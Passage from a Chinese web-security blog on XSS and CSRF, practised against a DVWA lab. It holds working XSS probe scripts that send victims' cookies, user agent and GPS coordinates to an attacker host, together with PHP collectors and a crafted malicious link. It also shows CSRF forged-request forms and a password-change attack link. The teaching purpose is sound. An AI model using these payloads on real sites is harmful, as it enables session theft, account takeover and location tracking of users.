<p><img src="https://i.loli.net/2021/11/13/MBbSkarUumApGKN.png" alt="image-20211113162257263"></p>
<p>这个对象，告诉了我们很多客户端信息：</p>
<blockquote>
<p>OS版本：Windows NT 10.0    （这是Windows10的内核版本）</p>
<p>浏览器版本：Firefox/94.0</p>
</blockquote>
<p>但是浏览器的UserAgent是可以伪造的。比如Firefox有很多扩展可以屏蔽或自定义浏览器发送的UserAgent。所以通过JavaScript取出来的这个浏览器对象，信息并不一定准确。</p>
<p>这里我写了两个脚本文件收集，可以收集客户端的User-Agent、IP地址、Cookie信息。</p>
<p>xss_probe.js</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> http_server = <span class="string">&quot;http://hackmee.com/attack/xss_probe.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlashVersion</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">     <span class="keyword">var</span> flashVer = <span class="literal">NaN</span>;</span><br><span class="line">     <span class="keyword">var</span> ua = navigator.userAgent;</span><br><span class="line"> </span><br><span class="line">     <span class="keyword">if</span> (<span class="built_in">window</span>.ActiveXObject) &#123;</span><br><span class="line">         <span class="keyword">var</span> swf = <span class="keyword">new</span> ActiveXObject(<span class="string">&#x27;ShockwaveFlash.ShockwaveFlash&#x27;</span>);</span><br><span class="line"> </span><br><span class="line">         <span class="keyword">if</span> (swf) &#123;</span><br><span class="line">             flashVer = <span class="built_in">Number</span>(swf.GetVariable(<span class="string">&#x27;$version&#x27;</span>).split(<span class="string">&#x27; &#x27;</span>)[<span class="number">1</span>].replace(<span class="regexp">/,/g</span>, <span class="string">&#x27;.&#x27;</span>).replace(<span class="regexp">/^(d+.d+).*$/</span>, <span class="string">&quot;$1&quot;</span>));</span><br><span class="line">         &#125;</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="keyword">if</span> (navigator.plugins &amp;&amp; navigator.plugins.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">             <span class="keyword">var</span> swf = navigator.plugins[<span class="string">&#x27;Shockwave Flash&#x27;</span>];</span><br><span class="line"> </span><br><span class="line">             <span class="keyword">if</span> (swf) &#123;</span><br><span class="line">                 <span class="keyword">var</span> arr = swf.description.split(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">                 <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, len = arr.length; i &lt; len; i++) &#123;</span><br><span class="line">                     <span class="keyword">var</span> ver = <span class="built_in">Number</span>(arr[i]);</span><br><span class="line"> </span><br><span class="line">                     <span class="keyword">if</span> (!<span class="built_in">isNaN</span>(ver)) &#123;</span><br><span class="line">                         flashVer = ver;</span><br><span class="line">                         <span class="keyword">break</span>;</span><br><span class="line">                     &#125;</span><br><span class="line">                 &#125;</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> flashVer;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">var</span> user_agent = navigator.userAgent;</span><br><span class="line"><span class="keyword">var</span> domain = <span class="built_in">document</span>.domain;</span><br><span class="line"><span class="keyword">var</span> cookie = <span class="built_in">document</span>.cookie;</span><br><span class="line"><span class="keyword">var</span> flash = getFlashVersion();</span><br><span class="line"> </span><br><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">new</span> Image().src = http_server + <span class="string">&quot;?ua=&quot;</span>+user_agent+<span class="string">&quot;&amp;domain=&quot;</span>+domain+<span class="string">&quot;&amp;cookie=&quot;</span>+cookie;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​    xss_probe.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@header(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"><span class="variable">$time</span> = date(<span class="string">&quot;Y-m-d H:i:s&quot;</span>);</span><br><span class="line"><span class="variable">$data</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$data</span> .= (<span class="string">&quot;IP: &quot;</span>.<span class="variable">$ip</span>.<span class="string">&quot;&lt;br&gt;Time: &quot;</span>.<span class="variable">$time</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;domain&#x27;</span>]))&#123;<span class="variable">$data</span> .= <span class="string">&quot;Domain: &quot;</span>; <span class="variable">$data</span> .= <span class="variable">$_GET</span>[<span class="string">&#x27;domain&#x27;</span>]; <span class="variable">$data</span>.=<span class="string">&quot;&lt;br&gt;&quot;</span>;&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ua&#x27;</span>]))&#123;<span class="variable">$data</span> .= <span class="string">&quot;User_Agetn: &quot;</span>; <span class="variable">$data</span> .= <span class="variable">$_GET</span>[<span class="string">&#x27;ua&#x27;</span>]; <span class="variable">$data</span>.=<span class="string">&quot;&lt;br&gt;&quot;</span>;&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>]))&#123;<span class="variable">$data</span> .= <span class="string">&quot;Cookie: &quot;</span>; <span class="variable">$data</span> .= <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>]; <span class="variable">$data</span>.=<span class="string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>;&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(!file_exists(<span class="string">&quot;data.html&quot;</span>))&#123;</span><br><span class="line"><span class="variable">$fp</span> = fopen(<span class="string">&quot;data.html&quot;</span>, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line">fwrite(<span class="variable">$fp</span>, <span class="string">&#x27;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;title&gt;Sensitive Information&lt;/title&gt;&lt;style&gt;body&#123;font-size:16px;&#125;&lt;/style&gt;&lt;/head&gt;&#x27;</span>);</span><br><span class="line">fclose(<span class="variable">$fp</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$fp</span> = fopen(<span class="string">&quot;data.html&quot;</span>, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line">fwrite(<span class="variable">$fp</span>, <span class="variable">$data</span>);</span><br><span class="line">fclose(<span class="variable">$fp</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>恶意链接：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:812/vulnerabilities/xss_r/?name=%3Cscript+src%3D%22http%3A%2F%2Fhackmee.com%2Fattack%2Fxss_probe.js%22%3E%3C%2Fscript%3E#</span><br></pre></td></tr></table></figure>
<p>当受害者访问我们构造的恶意链接，data.html便会记录客户端的信息。</p>
<p><img src="https://i.loli.net/2021/11/13/OiV8Bc5P3QWIjED.png" alt="image-20211113223745241"></p>
<h2 id="获取经纬度定位"><a href="#获取经纬度定位" class="headerlink" title="获取经纬度定位"></a>获取经纬度定位</h2><p>注意：获取经纬度的方法只可以在https协议的网站上才可使用。而且浏览器会弹出提示，总之限制很多。</p>
<p>gps.js</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getLocation</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (navigator.geolocation)</span><br><span class="line">    &#123;</span><br><span class="line">    navigator.geolocation.getCurrentPosition(showPosition);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;x.innerHTML=<span class="string">&quot;Geolocation is not supported by this browser.&quot;</span>;&#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showPosition</span>(<span class="params">position</span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    (<span class="keyword">new</span> Image()).src=<span class="string">&#x27;http://hackmee.com/attack/gps.php?do=api&amp;id=&#123;projectId&#125;&amp;weidu=&#x27;</span>+position.coords.latitude+<span class="string">&#x27;&amp;jingdu=&#x27;</span>+position.coords.longitude;</span><br><span class="line">&#125;</span><br><span class="line">       </span><br><span class="line">getLocation();</span><br></pre></td></tr></table></figure>
<p>gps.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="variable">$weidu</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;weidu&#x27;</span>];</span><br><span class="line">    <span class="variable">$jingdu</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;jingdu&#x27;</span>];</span><br><span class="line">    <span class="variable">$log</span> = fopen(<span class="string">&quot;gps.txt&quot;</span>,<span class="string">&quot;a&quot;</span>);</span><br><span class="line">    fwrite(<span class="variable">$log</span>,<span class="variable">$id</span>);</span><br><span class="line">    fwrite(<span class="variable">$log</span>,<span class="string">&quot;-维度:&quot;</span>);</span><br><span class="line">    fwrite(<span class="variable">$log</span>,<span class="variable">$weidu</span>);</span><br><span class="line">    fwrite(<span class="variable">$log</span>,<span class="string">&quot;-经度:&quot;</span>);</span><br><span class="line">    fwrite(<span class="variable">$log</span>,<span class="variable">$jingdu</span>);</span><br><span class="line">    fwrite(<span class="variable">$log</span>,<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    fclose(<span class="variable">$log</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>以上就是一些XSS的常见利用手段的剖析，在我们实战过程中可以使用XSS攻击平台对漏洞进行多维利用。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li>邱永华 著《XSS跨站脚本攻击剖析与防御》</li>
<li>吴翰清 著《白帽子讲Web安全》</li>
<li><a href="https://segmentfault.com/a/1190000022235530">你真的知道 Cookie 吗？ SameSite 、 Secure 、 HttpOnly - SegmentFault 思否</a></li>
<li><a href="https://blog.csdn.net/h_MXC/article/details/50542038">Session攻击手段(会话劫持/固定)及其安全防御措施_马学朝的博客-CSDN博客</a></li>
<li><a href="https://blog.csdn.net/eT48_sec/article/details/42193903"> XSS信息刺探脚本_eT48_Sec-CSDN博客</a></li>
</ul>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>XSS跨站脚本</category>
      </categories>
      <tags>
        <tag>XSS跨站脚本</tag>
      </tags>
  </entry>
  <entry>
    <title>深入浅出CSRF</title>
    <url>/post/66026644.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="CSRF的介绍"><a href="#CSRF的介绍" class="headerlink" title="CSRF的介绍"></a>CSRF的介绍</h2><p>CSRF（Cross-Site Request Forgery）即跨站点请求伪造，是一种广泛存在于网站中的安全漏洞，也是一种危害很大的客户端攻击手段。</p>
<p>CSRF经常配合XSS一起进行攻击，也有人把它归类成XSS攻击的一种。尽管CSRF原理和名字与XSS都很相像（都属于跨站攻击，不攻击服务器端而攻击正常访问网站的用户），但又不尽相同。</p>
<p>CSRF攻击可以在受害者毫不知情的情况下以受害者名义伪造请求发送给受攻击站点，从而在未授权的情况下执行在权限保护之下的操作，具有很大的危害性。具体来可以这样理解CSRF攻击：攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等。</p>
<p>CSRF 攻击方式并不为大家所熟知，实际上很多站点都存在CSRF的安全漏洞。早在2000年，CSRF这种攻击方式已经由国外的安全人员提出。但在国内，直到2006年才开始被关注。2008年，国内外多个大型社区和交互网站先后爆出CSRF漏洞，如：百度、NYTimes.com(纽约时报)、Metafilter(一个大型Blog网站）和YouTube等。但直到现在，互联网上的许多站点仍对此毫无防备，以至于安全业界称CSRF为“沉睡的巨人 ”，其威胁程度由此“美誉”便可见一斑。</p>
<h2 id="CSRF原理剖析"><a href="#CSRF原理剖析" class="headerlink" title="CSRF原理剖析"></a>CSRF原理剖析</h2><p>CSRF攻击能劫持终端用户在已登录的Web站点上执行非本意的操作。简单地说，攻击者透过盗用用户身份悄悄发送一个请求，或执行某些恶意操作。CSRF的过程非常隐蔽，受害者甚至无法察觉。</p>
<p>产生CSRF 漏洞的原因主要有两点：一方面是开发者不够审慎，编写的Web应用程序存在漏洞导致被恶意利用；另一方面，是因为Web浏览器对于Cookie和HTTP身份验证等会话信息的处理存在一定的缺陷。</p>
<p>如大家所知，现在的Web应用程序几乎都使用Cookie来识别用户身份。当用户登录网站并且完成身份验证后，浏览器会得到一个标识用户身份的Cookie，只要不退出或关闭浏览器，以后访问该网站下的页面的时候，对于用户的每一个请求，Web浏览器都会主动附带该网站的Cookie来标识身份。如此一来，用户不需要重新认证就可以被网站识别。</p>
<p>这时候，如果从第三方 Web 页面发起对当前网站域下的请求，该请求也会带上当前网站的Cookie，包括对Web页面中任意文件（如IMG)的请求都会带上相应的Cookie，这种认证方式称之为隐式认证，攻击者正是利用该缺陷实施CSRF攻击。</p>
<p>举个例子，假设某个站点具有转账功能，实现该功能的HTML表单如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;transfer.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">    账号：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;toBankId&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line">	金额：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;money&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这时候，只要用户输入相应的账号和金额并提交就能实现转账。于是，攻击者通过构造特殊的URL，如<code>http://bank.com/transfer.php?toBankId=99&amp;moncy=1000</code>，将链接发送给用户并诱使其单击，只要受害者单击了此链接，就会自动执行转账操作。</p>
<p>整个CSRF的过程如下图所示：</p>
<p><img src="https://i.loli.net/2021/11/17/S3fhUIeYB6EVwnp.png" alt="image-20211117215209808"></p>
<ol>
<li><p>受害者登录银行网站</p>
</li>
<li><p>通过身份验证，在受害者本地机器中生成Cookie</p>
</li>
<li><p>受害者单击了含恶意代码的链接，或者直接访问了第三方网站 attack.com，并浏览带有下面HTML代码的页面：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;bank.com/transfer.php?toBankId=99&amp;money=1000&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>恶意代码利用受害者的身份发送一个请求，即执行CSRF</p>
</li>
<li><p>受害者发现银行账户莫名其妙少了1000元</p>
</li>
</ol>
<p>以上CSRF案例之所以成功的一个原因是，开发人员滥用<code>$_REQUEST()</code>方法，导致本来的POST操作可以用GET方式实现。那么如果开发人员改用<code>$_POST()</code>方法来获取数据，是否就安全无忧了呢？答案是否定的。</p>
<p>如果一个网站中含有CSRF漏洞，并且接受GET请求形式，类似上例，只要使用<code>&lt;img&gt;</code>标签等请求形式就可以轻易发动CSRF攻击。但是，如果该网站仅接受POST请求，那么想成功执行CSRF就要从第三方网站发动攻击，且需要使用JavaScript代码。</p>
<p>要自动发送一个POST请求到目标站点，可以参考下面的HTML代码片段：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;test&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://bank.com/transfer.php&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;toBankId&quot;</span> <span class="attr">value</span>=<span class="string">&quot;99&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;money&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1000&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">	test.submit();</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>综上所述，攻击者想要发起CSRF攻击是一件相当容易的事情：只要精心构造一个恶意的URL诱使受害者单击，或者把预测好的请求参数放在站内图片链接中即可。而此类攻击往往会给用户和网站造成无法估计的损失和破坏。</p>
<h2 id="常见的CSRF方式"><a href="#常见的CSRF方式" class="headerlink" title="常见的CSRF方式"></a>常见的CSRF方式</h2><h3 id="img-标签属性"><a href="#img-标签属性" class="headerlink" title="img 标签属性"></a>img 标签属性</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://www.test.com/?command&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>&lt;img&gt;</code>以GET方式请求第三方资源，所以，浏览器会带上你的网站的Cookie发出的Get请求。</p>
<h3 id="script-标签属性"><a href="#script-标签属性" class="headerlink" title="script 标签属性"></a>script 标签属性</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://www.test.com/?command&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="iframe-标签属性"><a href="#iframe-标签属性" class="headerlink" title="iframe 标签属性"></a>iframe 标签属性</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://www.test.com/?command&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="JavaScript方法"><a href="#JavaScript方法" class="headerlink" title="JavaScript方法"></a>JavaScript方法</h3><h4 id="Image对象"><a href="#Image对象" class="headerlink" title="Image对象"></a>Image对象</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">	<span class="keyword">var</span> foo = <span class="keyword">new</span> Image();</span></span><br><span class="line"><span class="javascript">    foo.src = <span class="string">&quot;http://www.test.com/?command&quot;</span>;</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="XMLHTTP对象"><a href="#XMLHTTP对象" class="headerlink" title="XMLHTTP对象"></a>XMLHTTP对象</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">	<span class="keyword">var</span> post_data = <span class="string">&#x27;name=value&#x27;</span>;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> xmlhttp = <span class="keyword">new</span> ActiveXObject(<span class="string">&quot;Microsoft.XMLHTTP&quot;</span>);</span></span><br><span class="line"><span class="javascript">    xmlhttp.open(<span class="string">&quot;POST&quot;</span>, <span class="string">&#x27;http://www.test.com/file.ext&#x27;</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="javascript">    xmlhttp.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">		<span class="keyword">if</span> (xmlhttp.readyState == <span class="number">4</span>) &#123;</span></span><br><span class="line"><span class="javascript">			alert(xmlhttp.responseText);</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">    &#125;;</span></span><br><span class="line"><span class="javascript">    xmlhttp.send(post_data);</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="post方法"><a href="#post方法" class="headerlink" title="post方法"></a>post方法</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">	post(<span class="string">&#x27;http://www.test.com/&#x27;</span>,&#123;<span class="string">&#x27;CMD1&#x27;</span>:cmd1,<span class="string">&#x27;CMD2&#x27;</span>,cmd2&#125;);</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="CSRF与XSS的区别"><a href="#CSRF与XSS的区别" class="headerlink" title="CSRF与XSS的区别"></a>CSRF与XSS的区别</h2><table border="1px">
    <tr>
        <th></th>
        <th>CSRF</th>
        <th>XSS</th>
    </tr>
        <tr>
        <th>名字</th>
        <td>跨站请求伪造</td>
        <td>跨站脚本</td>
    </tr>
        <tr>
        <th>脚本</th>
        <td>未必需要脚本，如GET型的CSRF</td>
        <td>需要借助JavaScript脚本</td>
    </tr>
        <tr>
        <th>产生原因</th>
        <td>采用了隐式的认证方式</td>
        <td>对用户输入没有正确过滤</td>
    </tr>
        <tr>
        <th>防御技巧</th>
        <td>验证来源referer，使用验证码、token等</td>
        <td>输入过滤、输入编码等</td>
    </tr>
        <tr>
        <th>关系</th>
            <td colspan="2">
                （1）如果一个网站存在XSS漏洞，那么很大可能存在CSRF<br>
                （2）均利用用户的会话执行某些操作<br>
                （3）CSRF的恶意代码可能位于第三方站点，所以过滤用户的输入能够完美防御XSS漏洞，却未必能防御CSRF
            </td>
    </tr>
</table>



<h2 id="靶场演示（DVWA-CSRF）"><a href="#靶场演示（DVWA-CSRF）" class="headerlink" title="靶场演示（DVWA - CSRF）"></a>靶场演示（DVWA - CSRF）</h2><h3 id="Low级别"><a href="#Low级别" class="headerlink" title="Low级别"></a>Low级别</h3><p>源代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">	<span class="comment">// Get input</span></span><br><span class="line">	<span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">	<span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Do the passwords match?</span></span><br><span class="line">	<span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line">		<span class="comment">// They do!</span></span><br><span class="line">		<span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">		<span class="variable">$pass_new</span> = md5( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Update the database</span></span><br><span class="line">		<span class="variable">$insert</span> = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">		<span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Feedback for the user</span></span><br><span class="line">		<span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// Issue with passwords matching</span></span><br><span class="line">		<span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>GET方式得到三个参数，change、password_new、password_conf。如果password_new和password_conf相同，那么更新数据库，并没有任何防CSRF的措施。这里我们有多重攻击方式，比如直接构造链接、构造短链接和构造攻击页面。</p>
<p><strong>构造恶意链接</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:812/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#</span><br></pre></td></tr></table></figure>
<p>既然参数是GET方式传递的，那么我们可以直接在URL链接中设置参数，如果用户用登陆过该网站的浏览器（服务器会验证cookie）打开这个链接，那么将直接把参数传递给服务器，因为服务器并没有防CSRF的措施，所以直接可以攻击成功，密码将被改为123456。到那时如果用户在没有登陆过这个网站的浏览器上打开这个链接，并不会更改密码，而是跳转到登录界面。因为服务器在接受访问时，首先还要验证用户的cookie，如果浏览器上并没有之前登录留下的cookie，那攻击也就无法奏效。这么看来<strong>CSRF攻击的关键就是利用受害者的cookie向服务器发送伪造请求。</strong></p>
<p>上面的攻击链接太明显的，参数直接就在URL中，这样很容易就会被识破，为了隐藏URL，可以使用生成短链接的方式来实现。就是将原链接转换等一个比较短的URL链接，打开短链接和打开原链接等价的。</p>
<p><strong>构造攻击页面</strong></p>
<p>真实CSRF攻击中，攻击者为了隐藏自己的攻击手段，可能构造一个假的页面，然后放在公网上，诱导受害者访问这个页面，如果受害者访问了这个页面，那么受害者就会在不知情的情况下完成了CSRF攻击。自己测试可以写一个本地页面，也可以利用burpsuit直接生成攻击页面代码。方法如下：</p>
<p>抓取更改密码的数据包，利用engagement tools生成CSRF PoC，访问点击提交之后就可以更改密码。</p>
<p><img src="https://i.loli.net/2021/11/18/yk1sCXY9Te6nWUt.png" alt="image-20211118132229966"></p>
<p>复制生成的html代码即为我们需要的攻击页面代码。</p>
<p><img src="https://i.loli.net/2021/11/18/S6TOxsK81YWcDho.png" alt="image-20211118132246915"></p>
<p>访问点击提交之后就可以更改密码。</p>
<p><img src="https://i.loli.net/2021/11/18/NLDvpkIcyRgPxJs.png" alt="image-20211118131908075"></p>
<p><img src="https://i.loli.net/2021/11/18/YBkdeNluJoVWPKt.png" alt="image-20211118132350834"></p>
<h3 id="medium级别"><a href="#medium级别" class="headerlink" title="medium级别"></a>medium级别</h3><p>源代码如下：</p>
